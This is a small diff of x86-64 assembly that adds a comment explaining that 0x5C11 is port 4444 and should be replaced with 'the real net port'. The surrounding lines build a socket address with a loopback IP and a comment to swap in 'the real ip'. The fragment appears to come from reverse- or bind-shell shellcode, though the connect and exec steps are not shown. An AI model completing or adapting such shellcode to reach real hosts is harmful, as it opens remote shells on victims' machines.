@@ -30,7 +30,7 @@ _start:
     mov rdi, rax
 
     xor rbx, rbx
-    mov bx, 0x5C11
+    mov bx, 0x5C11              ; Change this with the real net port (0x5c11 is 4444)
     shl rbx, 16
     add rbx, 0x7F000001         ; Add IP address 127.0.0.1 (loopback in Big Endian) change it with the real ip
     push rbx
